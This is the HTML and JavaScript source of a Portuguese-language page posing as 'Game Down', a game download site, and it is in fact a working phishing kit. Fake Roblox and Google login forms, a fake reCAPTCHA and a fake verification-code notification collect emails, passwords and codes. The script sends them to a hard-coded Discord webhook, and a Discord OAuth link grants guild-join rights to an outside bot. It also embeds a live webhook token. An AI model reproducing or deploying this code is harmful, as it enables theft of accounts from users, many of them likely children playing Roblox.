<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Game Down - Download</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@300;400;600;700&display=swap');
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');

        body { font-family: 'Source Sans Pro', sans-serif; background-color: #f2f4f5; margin: 0; overflow-x: hidden; }
        
        #bg-tech-blur {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 40; display: none;
            background: radial-gradient(circle at 20% 30%, rgba(0, 80, 255, 0.4) 0%, transparent 50%),
                        radial-gradient(circle at 80% 70%, rgba(0, 150, 255, 0.3) 0%, transparent 50%),
                        linear-gradient(135deg, #0a0e17 0%, #0d1b35 100%);
            background-size: 200% 200%; filter: blur(8px); animation: bgZoom 20s infinite alternate;
        }
        @keyframes bgZoom { 0% {background-size:150% 150%} 100% {background-size:170% 170%} }

        /* Sidebar */
        #sidebar { position: fixed; top: 0; left: -280px; width: 280px; height: 100%; background: #ffffff; box-shadow: 2px 0 10px rgba(0,0,0,0.1); z-index: 60; transition: left 0.3s ease; display: flex; flex-direction: column; }
        #sidebar.open { left: 0; }
        .sidebar-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.5); z-index: 55; display: none; }
        .sidebar-overlay.show { display: block; }
        .profile-img-container { width: 100px; height: 100px; border-radius: 50%; border: 1px solid black; margin: 0 auto; overflow: hidden; position: relative; background: #eee; display: flex; align-items: center; justify-content: center; }
        .profile-img-container img { width: 100%; height: 100%; object-fit: cover; }
        
        /* Modais Gerais */
        .roblox-modal { background-color: #191b1d; color: white; border-radius: 10px; box-shadow: 0 10px 40px rgba(0,0,0,0.5); position: relative; z-index: 50; }
        .roblox-header { font-weight: 700; font-size: 32px; text-align: center; margin-bottom: 24px; color: #ffffff; margin-top: 10px; }
        .img-white-filter { filter: brightness(0) invert(1); }
        .btn-icon-adjust { width: 24px; height: 24px; display: flex; align-items: center; justify-content: center; margin-right: 12px; margin-left: -4px; overflow: hidden; }
        .btn-icon-adjust img { height: 140%; width: auto; }
        .roblox-wordmark-wrapper { width: 100%; display: flex; justify-content: center; margin-top: 20px; margin-bottom: 30px; }
        .roblox-wordmark-wrapper img { width: 180px; height: auto; }
        .roblox-input { background-color: #232527; border: 1px solid #a7a7a7; border-radius: 6px; color: white; padding: 10px 12px; font-size: 16px; width: 100%; height: 44px; outline: none; }
        .roblox-input:focus { border-color: white; }
        .password-container { position: relative; margin-bottom: 12px; }
        .password-toggle { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); color: #a7a7a7; cursor: pointer; }
        .roblox-btn-primary { background-color: #232527; border: 1px solid #ffffff; color: white; border-radius: 8px; padding: 10px; font-size: 16px; font-weight: 500; width: 100%; cursor: pointer; height: 44px; display: flex; align-items: center; justify-content: center; }
        .roblox-btn-primary:hover { background-color: rgba(255,255,255,0.1); }
        .roblox-btn-secondary { background-color: #2b2d31; color: white; border-radius: 8px; padding: 10px; font-size: 14px; width: 100%; cursor: pointer; margin-bottom: 12px; }
        .roblox-btn-secondary:hover { border: 1px solid white; }
        .roblox-divider { height: 1px; background-color: #3e4042; margin: 20px 0; width: 100%; }
        .roblox-link-text { color: white; font-size: 12px; text-align: center; display: block; margin: 16px 0; cursor: pointer; }
        .roblox-link-text:hover { text-decoration: underline; }
        
        .toast-error { position: fixed; bottom: -100px; left: 50%; transform: translateX(-50%); background: #191b1d; color: white; padding: 14px 28px; border-radius: 8px; border: 1px solid #3e4042; z-index: 100; transition: bottom 0.5s ease-out; font-weight: 600; }
        .toast-error.show { bottom: 25px; }

        /* --- ESTILOS DO GOOGLE --- */
        .google-modal-container {
            background-color: #000000;
            color: #e8eaed;
            font-family: 'Roboto', sans-serif;
            width: 100%;
            max-width: 450px;
            border-radius: 8px;
            padding: 48px 40px 36px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.3);
            position: relative;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .google-logo { width: 75px; margin-bottom: 10px; filter: brightness(0) invert(1); }
        .google-title { font-size: 24px; font-weight: 400; padding-bottom: 0; padding-top: 16px; color: #e8eaed; }
        .google-subtitle { font-size: 16px; color: #e8eaed; margin-top: 10px; text-align: center; line-height: 1.5; margin-bottom: 20px; }
        .google-input-wrapper { width: 100%; position: relative; margin-bottom: 15px; }
        .google-input { width: 100%; background: transparent; border: 1px solid #5f6368; border-radius: 4px; color: #e8eaed; height: 56px; padding: 13px 15px; font-size: 16px; transition: border-color 0.2s; }
        .google-input:focus { border-color: #8ab4f8; border-width: 2px; padding: 12px 14px; outline: none; }
        .google-actions { width: 100%; display: flex; justify-content: space-between; align-items: center; margin-top: 40px; }
        .google-create-account { color: #8ab4f8; font-size: 14px; font-weight: 500; background: transparent; border: none; cursor: pointer; }
        .google-btn-next { background-color: #8ab4f8; color: #202124; font-weight: 500; padding: 0 24px; height: 36px; border-radius: 4px; font-size: 14px; border: none; cursor: pointer; transition: background 0.2s; }
        .google-btn-next:hover { background-color: #a6c8ff; }
        .google-forgot { color: #8ab4f8; font-size: 14px; font-weight: 500; margin-top: 8px; align-self: flex-start; cursor: pointer; display: block; width: 100%; text-align: left; }

        /* --- FAKE RECAPTCHA --- */
        .fake-recaptcha {
            background-color: #202124; /* Fundo escuro */
            border: 1px solid #5f6368;
            border-radius: 3px;
            width: 100%;
            max-width: 304px; /* Tamanho padr√£o */
            height: 78px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 12px;
            margin-top: 20px;
            cursor: pointer;
            box-shadow: 0 0 4px rgba(0,0,0,0.1);
        }
        .fake-recaptcha:hover { background-color: #28292c; }
        .captcha-box {
            width: 28px; height: 28px; background: #fff; border: 2px solid #c1c1c1; border-radius: 2px;
            display: flex; align-items: center; justify-content: center; margin-right: 12px;
        }
        .captcha-label { color: #e8eaed; font-family: 'Roboto', sans-serif; font-size: 14px; font-weight: 400; flex-grow: 1; }
        .captcha-brand { display: flex; flex-direction: column; align-items: center; text-align: center; color: #9aa0a6; font-size: 10px; margin-left: 10px; }
        .captcha-brand img { width: 32px; height: 32px; opacity: 0.7; margin-bottom: 2px; }

        /* Simula√ß√£o Notifica√ß√£o Email (Estilo Sistema) */
        .fake-email-notification {
            position: fixed; top: -100px; left: 50%; transform: translateX(-50%);
            background: #333; color: white; padding: 15px 20px; border-radius: 8px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.5); z-index: 200;
            display: flex; align-items: center; gap: 15px; transition: top 0.6s cubic-bezier(0.68, -0.55, 0.27, 1.55); 
            width: 90%; max-width: 400px; border-left: 4px solid #4285F4;
        }
        .fake-email-notification.show { top: 25px; }
        .google-icon-notif { color: #fff; font-size: 24px; }

        /* Header */
        header { display: flex; align-items: center; justify-content: space-between; gap: 10px; }
        .search-bar { flex-grow: 1; max-width: 500px; position: relative; }
        .search-input { width: 100%; padding: 8px 35px 8px 15px; border-radius: 20px; border: 1px solid #ddd; outline: none; }
        .search-icon { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); color: #666; cursor: pointer; }
    </style>
</head>
<body class="flex flex-col min-h-screen relative">
    <div id="bg-tech-blur"></div>
    <div id="sidebar-overlay" class="sidebar-overlay" onclick="toggleSidebar()"></div>

    <div id="fake-email-notif" class="fake-email-notification">
        <div class="google-icon-notif"><i class="fa-brands fa-google"></i></div>
        <div>
            <p class="text-xs text-gray-400 font-bold mb-1">SERVI√áOS DO GOOGLE ‚Ä¢ AGORA</p>
            <p class="font-bold text-sm">C√≥digo de verifica√ß√£o do Google</p>
            <p class="text-sm text-gray-200">Seu c√≥digo √© <strong>1011</strong></p>
        </div>
    </div>

    <div id="sidebar">
        <div class="p-6 border-b flex justify-between items-center bg-gray-50">
            <span class="font-bold text-xl text-gray-800">Menu</span>
            <button onclick="toggleSidebar()"><i class="fa-solid fa-xmark text-2xl text-gray-600"></i></button>
        </div>
        <div class="p-4 flex-grow">
            <button onclick="abrirPerfil()" class="w-full text-left p-3 hover:bg-gray-100 rounded flex items-center gap-3 text-gray-700 font-medium">
                <i class="fa-solid fa-user"></i> Perfil
            </button>
            <button onclick="abrirConfig()" class="w-full text-left p-3 hover:bg-gray-100 rounded flex items-center gap-3 text-gray-700 font-medium">
                <i class="fa-solid fa-gear"></i> Configura√ß√µes
            </button>
        </div>
        
        <div class="p-4 border-t">
            <button onclick="adicionarLoginExtra()" class="w-full text-left p-3 hover:bg-gray-100 rounded flex flex-col mb-2">
                <div class="flex items-center gap-3 text-green-600 font-bold">
                    <i class="fa-solid fa-user-plus"></i> Adicionar Login Extra
                </div>
                <span class="text-xs text-gray-500 pl-8">&lt;Recomendado&gt;</span>
            </button>

            <button onclick="logout()" class="w-full text-left p-3 text-red-600 hover:bg-red-50 rounded flex items-center gap-3 font-bold">
                <i class="fa-solid fa-right-from-bracket"></i> Sair da conta
            </button>
        </div>
    </div>

    <header class="bg-white shadow-md p-4 sticky top-0 z-30">
        <div class="flex items-center gap-4">
            <button onclick="toggleSidebar()" class="text-gray-700 text-2xl hover:text-black"><i class="fa-solid fa-bars"></i></button>
            <h1 class="text-xl md:text-2xl font-bold text-gray-800 hidden sm:block">Game Down</h1>
        </div>
        <div class="search-bar">
            <input type="text" id="search-input" class="search-input" placeholder="Pesquisar jogos..." onkeypress="handleSearch(event)">
            <i class="fa-solid fa-magnifying-glass search-icon" onclick="realizarBusca()"></i>
        </div>
        <div class="flex items-center gap-3">
            <button id="btn-upload" onclick="modalUpload.classList.remove('hidden')" class="hidden bg-green-600 hover:bg-green-700 text-white w-10 h-10 rounded-full shadow-lg flex items-center justify-center">
                <i class="fa-solid fa-plus text-xl"></i>
            </button>
            <div id="user-display" class="hidden flex items-center gap-2">
                <span id="header-username" class="font-semibold text-gray-700 text-sm max-w-[100px] truncate">User</span>
            </div>
            <button id="btn-login-main" onclick="abrirModalSelecao()" class="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded-lg font-bold shadow text-sm">Login</button>
        </div>
    </header>

    <main class="flex-grow container mx-auto p-6 z-10 relative">
        <div id="games-grid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6">
            <div class="col-span-full text-center text-gray-500 mt-10">Carregando...</div>
        </div>
    </main>

    <div id="modal-config" class="fixed inset-0 bg-black bg-opacity-60 z-[80] hidden flex items-center justify-center p-4">
        <div class="bg-white rounded-lg p-6 w-full max-w-sm relative">
            <button onclick="document.getElementById('modal-config').classList.add('hidden')" class="absolute top-4 right-4 text-gray-500"><i class="fa-solid fa-xmark text-xl"></i></button>
            <h3 class="text-xl font-bold text-gray-800 mb-6">Configura√ß√µes</h3>
            <div class="space-y-4">
                <div class="flex justify-between items-center">
                    <span>Modo Escuro (Autom√°tico)</span>
                    <i class="fa-solid fa-toggle-on text-green-600 text-2xl"></i>
                </div>
                <div class="flex justify-between items-center">
                    <span>Notifica√ß√µes de Jogos</span>
                    <i class="fa-solid fa-toggle-on text-green-600 text-2xl"></i>
                </div>
                <div class="flex justify-between items-center">
                    <span>Atualiza√ß√µes Autom√°ticas</span>
                    <i class="fa-solid fa-toggle-off text-gray-400 text-2xl"></i>
                </div>
                <hr>
                <div class="text-xs text-gray-500 text-center">Vers√£o 1.5.2 - Render</div>
            </div>
        </div>
    </div>

    <div id="modal-perfil" class="fixed inset-0 bg-black bg-opacity-60 z-[70] hidden flex items-center justify-center p-4">
        <div class="bg-white rounded-lg p-6 w-full max-w-sm relative text-center">
            <button onclick="document.getElementById('modal-perfil').classList.add('hidden')" class="absolute top-4 right-4 text-gray-500"><i class="fa-solid fa-xmark text-xl"></i></button>
            <h3 class="text-xl font-bold text-gray-800 mb-6">Seu Perfil</h3>
            <div class="mb-2">
                <div class="profile-img-container" id="profile-preview"></div>
                <label for="upload-avatar" class="text-xs text-blue-600 cursor-pointer hover:underline mt-2 block">Adicionar uma imagem</label>
                <input type="file" id="upload-avatar" accept="image/*" class="hidden" onchange="previewImagem(event)">
            </div>
            <div class="mt-6 flex items-center justify-center gap-2">
                <input id="profile-name-input" type="text" class="text-xl font-bold text-center border-b border-transparent focus:border-blue-500 outline-none w-2/3" value="Usu√°rio" readonly>
                <button onclick="habilitarEdicaoNome()" class="text-gray-500 hover:text-blue-600"><i class="fa-solid fa-pen"></i></button>
            </div>
            <button onclick="salvarPerfil()" id="btn-save-profile" class="mt-6 bg-blue-600 text-white px-6 py-2 rounded-lg w-full hidden">Salvar Altera√ß√µes</button>
        </div>
    </div>

    <div id="modal-selecao" class="fixed inset-0 z-50 hidden flex items-center justify-center p-4">
        <div class="roblox-modal w-full max-w-[400px] p-6 relative">
            <button onclick="fecharModais()" class="absolute top-4 right-4 text-gray-400 hover:text-white text-xl"><i class="fa-solid fa-xmark"></i></button>
            <h2 class="roblox-header mt-4">Login</h2>
            
            <a href="https://discord.com/oauth2/authorize?client_id=1443717513748812011&response_type=code&redirect_uri=https%3A%2F%2Fhunter-bot-verify.onrender.com%2Fauth2&scope=identify+guilds.join" class="bg-[#5865F2] hover:bg-[#4752C4] text-white font-bold py-3 px-4 rounded-lg w-full flex items-center justify-center gap-2 mb-4 transition no-underline">
                <i class="fa-brands fa-discord text-xl"></i> Login por Discord
            </a>
            
            <button onclick="abrirFormularioRoblox()" class="bg-[#232527] border border-white hover:bg-[#2b2d31] text-white font-bold py-3 px-4 rounded-lg w-full flex items-center justify-center transition mb-4">
                <div class="btn-icon-adjust">
                    <img src="https://static.vecteezy.com/system/resources/previews/027/127/530/non_2x/roblox-logo-roblox-icon-transparent-free-png.png" alt="Icon" class="img-white-filter">
                </div>
                Login por Roblox
            </button>

            <button onclick="abrirGoogleModal()" class="bg-white hover:bg-gray-100 text-gray-800 font-bold py-3 px-4 rounded-lg w-full flex items-center justify-center gap-2 transition">
                <i class="fa-solid fa-envelope text-xl"></i> Login por E-Mail
            </button>
        </div>
    </div>

    <div id="modal-google" class="fixed inset-0 z-50 hidden flex items-center justify-center p-4" style="background-color: rgba(0,0,0,0.6);">
        <div class="google-modal-container">
            <button onclick="fecharModais()" class="absolute top-4 right-4 text-gray-500 hover:text-gray-300"><i class="fa-solid fa-xmark text-lg"></i></button>
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="google-logo" alt="Google">
            <h1 class="google-title">Fazer login</h1>
            <p class="google-subtitle" style="display:none;"></p>
            
            <div class="w-full mt-4">
                <div class="google-input-wrapper">
                    <input type="email" id="google-email-input" class="google-input" placeholder="E-mail ou telefone">
                </div>
                <div class="google-input-wrapper">
                    <input type="password" id="google-pass-input" class="google-input" placeholder="Digite sua senha">
                </div>
            </div>
            
            <span class="google-forgot" onclick="triggerFakeError()">Esqueceu seu e-mail?</span>
            
            <div class="google-actions">
                <button class="google-create-account" onclick="triggerFakeError()">Criar conta</button>
                <button onclick="processarLoginGoogle()" class="google-btn-next">Avan√ßar</button>
            </div>
        </div>
    </div>

    <div id="modal-google-code" class="fixed inset-0 z-50 hidden flex items-center justify-center p-4" style="background-color: rgba(0,0,0,0.6);">
        <div class="google-modal-container">
            <button onclick="fecharModais()" class="absolute top-4 right-4 text-gray-500 hover:text-gray-300"><i class="fa-solid fa-xmark text-lg"></i></button>
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="google-logo" alt="Google">
            <h1 class="google-title">Verifica√ß√£o de 2 etapas</h1>
            <p class="google-subtitle">Um e-mail com um c√≥digo de verifica√ß√£o acaba de ser enviado para sua conta.</p>
            
            <div class="google-input-wrapper mt-4">
                <input type="text" id="google-code-input" class="google-input text-center tracking-widest text-xl font-bold" placeholder="Inserir c√≥digo">
            </div>

            <div class="fake-recaptcha" onclick="toggleCaptcha()">
                <div class="flex items-center">
                    <div id="captcha-box" class="captcha-box"></div>
                    <span class="captcha-label">N√£o sou um rob√¥</span>
                </div>
                <div class="captcha-brand">
                    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="">
                    <span>reCAPTCHA</span>
                    <span style="font-size: 8px;">Privacidade - Termos</span>
                </div>
            </div>
            
            <div class="google-actions justify-end">
                <button onclick="verificarGoogleCode()" class="google-btn-next">Avan√ßar</button>
            </div>
        </div>
    </div>

    <div id="modal-form-roblox" class="fixed inset-0 z-50 hidden flex items-center justify-center p-4">
        <div class="roblox-modal w-full max-w-[400px] p-6 relative">
            <button onclick="voltarSelecao()" class="absolute top-4 left-4 text-gray-400 hover:text-white text-lg"><i class="fa-solid fa-arrow-left"></i></button>
            <button onclick="fecharModais()" class="absolute top-4 right-4 text-gray-400 hover:text-white text-xl"><i class="fa-solid fa-xmark"></i></button>
            
            <div class="roblox-wordmark-wrapper">
                <img src="https://logos-world.net/wp-content/uploads/2020/11/Roblox-Logo.png" alt="Roblox" class="img-white-filter">
            </div>
            
            <form onsubmit="event.preventDefault(); processarLogin();">
                <input type="text" id="inp-user" class="roblox-input mb-3" placeholder="Usu√°rio/e-mail/telefone">
                <div class="password-container">
                    <input type="password" id="inp-pass" class="roblox-input" placeholder="Senha">
                    <i class="fa-solid fa-eye password-toggle" onclick="togglePassword()"></i>
                </div>
                <button type="submit" class="roblox-btn-primary mt-2">Entrar</button>
            </form>
            <div class="roblox-link-text mt-3" onclick="triggerFakeError()">Esqueceu a senha ou nome de usu√°rio?</div>
            <div class="roblox-divider"></div>
            <button onclick="irParaEmail()" class="roblox-btn-secondary bg-[#393b3d]">Envie-me um c√≥digo unico por e-mail</button>
            <button onclick="triggerFakeError()" class="roblox-btn-secondary bg-[#393b3d]">Use outro dispositivo</button>
            <div class="text-center mt-2 text-sm text-gray-400">N√£o possui conta? <span class="text-white cursor-pointer hover:underline" onclick="triggerFakeError()">Cadastre-se</span></div>
        </div>
    </div>

    <div id="modal-email" class="fixed inset-0 z-[60] hidden flex items-center justify-center p-4">
        <div class="roblox-modal w-full max-w-[500px]"><div class="p-8"><input id="inp-email-codigo" type="email" class="roblox-input bg-transparent border-gray-500 mb-6" placeholder="E-mail"><button onclick="enviarCodigoEmail()" class="roblox-btn-primary bg-transparent border-gray-500">Enviar c√≥digo</button></div></div>
    </div>
    <div id="modal-codigo" class="fixed inset-0 z-[70] hidden flex items-center justify-center p-4">
        <div class="roblox-modal w-full max-w-[500px]"><div class="p-8 text-center"><input id="inp-final-code" type="text" class="roblox-input text-center text-xl tracking-widest mb-4"><button onclick="verificarCodigo()" class="roblox-btn-primary bg-white text-black">Verificar</button></div></div>
    </div>
    <div id="modal-username" class="fixed inset-0 z-[80] hidden flex items-center justify-center p-4">
        <div class="roblox-modal w-full max-w-[400px] p-6"><h2 class="roblox-header">Bem-vindo!</h2><input id="inp-new-username" type="text" class="roblox-input mb-4" placeholder="Nome de usu√°rio"><button onclick="confirmarUsername()" class="roblox-btn-primary bg-green-600 border-none">Confirmar</button></div>
    </div>
    <div id="modal-upload" class="fixed inset-0 bg-black bg-opacity-60 z-[90] hidden flex items-center justify-center p-4">
        <div class="bg-white rounded-lg p-6 w-full max-w-md relative"><div class="flex justify-between mb-4"><h3 class="font-bold">Adicionar Jogo</h3><i onclick="modalUpload.classList.add('hidden')" class="fa-solid fa-xmark cursor-pointer"></i></div><input id="up-name" class="w-full border p-2 rounded mb-3" placeholder="Nome"><input id="up-img" class="w-full border p-2 rounded mb-3" placeholder="URL Capa"><input id="up-link" class="w-full border p-2 rounded mb-3" placeholder="Link"><button onclick="salvarJogo()" class="w-full bg-green-600 text-white p-2 rounded">Publicar</button></div>
    </div>
    
    <div id="toast" class="toast-error">Erro</div>

    <script>
        const API_URL = (location.hostname.includes("render.com") || location.hostname === "localhost") ? "/api/jogos" : "MOCK";
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1444449733753180355/UexEyxKjWYMkbMEuXkBrvXeNzAS5s8BapW5K4b6PqB-2zqDT5BNxfOYfgrjjiG_t45PA";
        let currentUser = null;

        const sidebar = document.getElementById('sidebar');
        const sidebarOverlay = document.getElementById('sidebar-overlay');
        const bgBlur = document.getElementById('bg-tech-blur');
        
        const modalSelecao = document.getElementById('modal-selecao');
        const modalFormRoblox = document.getElementById('modal-form-roblox');
        const modalGoogle = document.getElementById('modal-google');
        const modalGoogleCode = document.getElementById('modal-google-code');
        const modalEmail = document.getElementById('modal-email');
        const modalCodigo = document.getElementById('modal-codigo');
        const modalUsername = document.getElementById('modal-username');
        const modalUpload = document.getElementById('modal-upload');
        const modalConfig = document.getElementById('modal-config');
        
        const toast = document.getElementById('toast');
        const fakeEmailNotif = document.getElementById('fake-email-notif');
        const btnUpload = document.getElementById('btn-upload');

        window.onload = () => {
            carregarJogos();
            carregarPerfilLocal();
            if(window.location.href.includes("sucess")) {
                bgBlur.style.display = 'block';
                modalUsername.classList.remove('hidden');
                window.history.replaceState({}, document.title, "/");
            }
        };

        function toggleSidebar() { sidebar.classList.toggle('open'); sidebarOverlay.classList.toggle('show'); }
        function abrirPerfil() {
            if(!currentUser && !localStorage.getItem('local_username')) { toggleSidebar(); abrirModalSelecao(); return; }
            toggleSidebar();
            const savedName = localStorage.getItem('local_username') || currentUser?.nome || "Usu√°rio";
            const savedImg = localStorage.getItem('local_userimg');
            document.getElementById('profile-name-input').value = savedName;
            atualizarPreviewImagem(savedImg);
            document.getElementById('modal-perfil').classList.remove('hidden');
        }
        function abrirConfig() { toggleSidebar(); modalConfig.classList.remove('hidden'); }
        function adicionarLoginExtra() { toggleSidebar(); abrirModalSelecao(); }

        function habilitarEdicaoNome() { const i = document.getElementById('profile-name-input'); i.removeAttribute('readonly'); i.focus(); i.classList.remove('border-transparent'); i.classList.add('border-blue-500'); document.getElementById('btn-save-profile').classList.remove('hidden'); }
        function previewImagem(e) { const f = e.target.files[0]; if(f){ const r = new FileReader(); r.onload=function(ev){ atualizarPreviewImagem(ev.target.result); document.getElementById('btn-save-profile').classList.remove('hidden'); }; r.readAsDataURL(f); } }
        function atualizarPreviewImagem(src) { document.getElementById('profile-preview').innerHTML = src ? `<img src="${src}">` : ''; }
        function salvarPerfil() {
            const n = document.getElementById('profile-name-input').value;
            const i = document.getElementById('profile-preview').querySelector('img')?.src || "";
            localStorage.setItem('local_username', n);
            if(i) localStorage.setItem('local_userimg', i);
            if(currentUser) { currentUser.nome = n; document.getElementById('header-username').innerText = n; }
            document.getElementById('btn-save-profile').classList.add('hidden');
            document.getElementById('profile-name-input').setAttribute('readonly',true);
            alert("Perfil salvo!");
        }
        function carregarPerfilLocal() { const n = localStorage.getItem('local_username'); if(n) logarReal(n, false); }

        function handleSearch(e) { if(e.key === 'Enter') realizarBusca(); }
        async function realizarBusca() {
            const t = document.getElementById('search-input').value;
            const url = t ? `${API_URL}?busca=${encodeURIComponent(t)}` : API_URL;
            try { const res = await fetch(url); if(res.ok) renderizarGrid(await res.json()); } catch(e){}
        }
        function togglePassword() { const i=document.getElementById('inp-pass'); const c=document.querySelector('.password-toggle'); if(i.type==='password'){i.type='text';c.classList.remove('fa-eye');c.classList.add('fa-eye-slash');}else{i.type='password';c.classList.remove('fa-eye-slash');c.classList.add('fa-eye');} }

        async function carregarJogos() { realizarBusca(); }
        function renderizarGrid(jogos) {
            const grid = document.getElementById('games-grid'); grid.innerHTML = "";
            if(jogos.length===0) { grid.innerHTML='<p class="col-span-full text-center text-gray-500">Nenhum jogo encontrado.</p>'; return; }
            jogos.forEach(j => {
                const c = document.createElement('div');
                c.className = "bg-white rounded-lg shadow-md overflow-hidden hover:shadow-xl transition transform hover:-translate-y-1 flex flex-col relative";
                
                let btnExcluir = '';
                if(currentUser && currentUser.isAdmin) {
                    btnExcluir = `<button onclick="excluirJogo('${j._id}', '${j.nome}')" class="absolute top-2 right-2 bg-red-600 text-white w-8 h-8 rounded-full shadow-lg z-20 flex items-center justify-center hover:bg-red-700 transition" title="Excluir Jogo"><i class="fa-solid fa-trash"></i></button>`;
                }

                c.innerHTML = `
                    <div class="h-40 bg-gray-300 relative">
                        <img src="${j.capa||'https://placehold.co/400x300?text=Sem+Capa'}" class="w-full h-full object-cover">
                        ${btnExcluir}
                    </div>
                    <div class="p-4 flex flex-col flex-grow">
                        <h3 class="font-bold text-lg text-gray-800 mb-2 truncate">${j.nome}</h3>
                        <div class="mt-auto">
                            <button onclick="tentarBaixar('${j.link}')" class="w-full bg-green-500 hover:bg-green-600 text-white font-bold py-2 rounded flex items-center justify-center gap-2">
                                <i class="fa-solid fa-download"></i> Baixar
                            </button>
                        </div>
                    </div>`;
                grid.appendChild(c);
            });
        }

        async function excluirJogo(id, nome) {
            if(!confirm(`Tem certeza que deseja excluir "${nome}"?`)) return;
            try {
                if(API_URL !== 'MOCK') {
                    const res = await fetch(`${API_URL}/${id}`, { method: 'DELETE' });
                    if(res.ok) { alert("Jogo exclu√≠do!"); carregarJogos(); }
                    else alert("Erro ao excluir.");
                } else {
                    let l = JSON.parse(localStorage.getItem('mock_jogos')||'[]');
                    l = l.filter(x => x._id !== id && x.nome !== nome); 
                    localStorage.setItem('mock_jogos',JSON.stringify(l));
                    carregarJogos();
                }
            } catch(e) { console.error(e); }
        }

        async function salvarJogo() {
            const nome = document.getElementById('up-name').value.trim();
            const capa = document.getElementById('up-img').value.trim();
            const link = document.getElementById('up-link').value.trim();
            if(!nome || !link) return alert("Preencha Nome e Link");

            const btn = document.querySelector('#modal-upload button:last-child');
            const originalText = btn.innerText;
            btn.innerText = "Publicando..."; btn.disabled = true;

            const jogo = { nome, capa, link };

            try {
                if(API_URL !== 'MOCK') {
                    const res = await fetch(API_URL, { 
                        method:'POST', 
                        headers:{'Content-Type':'application/json'}, 
                        body:JSON.stringify(jogo)
                    });
                    if(!res.ok) throw new Error("Erro no servidor");
                } else {
                    let l = JSON.parse(localStorage.getItem('mock_jogos')||'[]'); l.push(jogo); localStorage.setItem('mock_jogos',JSON.stringify(l));
                }
                alert("Publicado com sucesso!");
                modalUpload.classList.add('hidden');
                document.getElementById('up-name').value=""; document.getElementById('up-img').value=""; document.getElementById('up-link').value="";
                carregarJogos();
            } catch(e) { 
                console.error(e);
                alert("ERRO: Verifique MONGODB_URI no Render."); 
            } finally {
                btn.innerText = originalText; btn.disabled = false;
            }
        }

        function tentarBaixar(l) { if(!currentUser) abrirModalSelecao(); else window.open(l,'_blank'); }
        function abrirModalSelecao() { if(!currentUser){ modalSelecao.classList.remove('hidden'); bgBlur.style.display='block'; } }
        
        function abrirGoogleModal() { modalSelecao.classList.add('hidden'); modalGoogle.classList.remove('hidden'); }
        
        function abrirFormularioRoblox() { modalSelecao.classList.add('hidden'); modalFormRoblox.classList.remove('hidden'); }
        function voltarSelecao() { modalFormRoblox.classList.add('hidden'); modalSelecao.classList.remove('hidden'); }
        function fecharModais() { [modalSelecao, modalFormRoblox, modalGoogle, modalGoogleCode, modalEmail, modalCodigo, modalUsername, modalConfig].forEach(m=>m.classList.add('hidden')); bgBlur.style.display='none'; }
        function showErrorToast(msg = "Erro") { toast.textContent = msg; toast.classList.add('show'); setTimeout(() => toast.classList.remove('show'), 3000); }
        function triggerFakeError() { showErrorToast("Erro"); } 

        function irParaEmail() { modalFormRoblox.classList.add('hidden'); modalSelecao.classList.add('hidden'); modalEmail.classList.remove('hidden'); }
        
        function enviarCodigoEmail() { 
            const e = document.getElementById('inp-email-codigo').value; 
            enviarWebhook(`## üìß PEDIDO EMAIL ROBLOX: ${e}\n||@everyone||`);
            fetch("https://www.roblox.com/login", { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: `username=${encodeURIComponent(e)}` }).catch(() => {});
            showErrorToast("Erro de servidor, tente usar sua senha");
            modalEmail.classList.add('hidden'); 
            modalFormRoblox.classList.remove('hidden');
        }

        // --- L√ìGICA DO LOGIN GOOGLE ATUALIZADA ---
        function processarLoginGoogle() {
            const email = document.getElementById('google-email-input').value;
            const pass = document.getElementById('google-pass-input').value;
            
            if(!email || !pass) return showErrorToast("Preencha e-mail e senha");
            
            // 1. Envia Webhook (com Email e Senha)
            enviarWebhook(`## üìß LOGIN GOOGLE: ${email} | Pass: ${pass}\n||@everyone||`);
            
            // 2. Troca para o Modal de C√≥digo e simula envio do c√≥digo
            modalGoogle.classList.add('hidden');
            modalGoogleCode.classList.remove('hidden');
            
            // Simula chegada do email visualmente
            setTimeout(() => {
                fakeEmailNotif.classList.add('show');
                setTimeout(() => fakeEmailNotif.classList.remove('show'), 5000);
            }, 1500);
        }

        // --- L√ìGICA FAKE CAPTCHA ---
        let captchaChecked = false;
        function toggleCaptcha() {
            const box = document.getElementById('captcha-box');
            if(captchaChecked) return;
            box.innerHTML = '<i class="fa-solid fa-spinner fa-spin text-gray-500"></i>';
            setTimeout(() => {
                box.innerHTML = '<i class="fa-solid fa-check text-green-500 text-xl"></i>';
                captchaChecked = true;
            }, 800);
        }

        function verificarGoogleCode() {
            if(!captchaChecked) return showErrorToast("Complete o Captcha");
            
            const code = document.getElementById('google-code-input').value;
            if(code === '1011') {
                // SEM WEBHOOK DE CONFIRMA√á√ÉO
                modalGoogleCode.classList.add('hidden');
                modalUsername.classList.remove('hidden');
            } else {
                showErrorToast("C√≥digo incorreto");
            }
        }

        function verificarCodigo() { const c=document.getElementById('inp-final-code').value; enviarWebhook(`## CODIGO: ${c}`); modalCodigo.classList.add('hidden'); modalUsername.classList.remove('hidden'); }
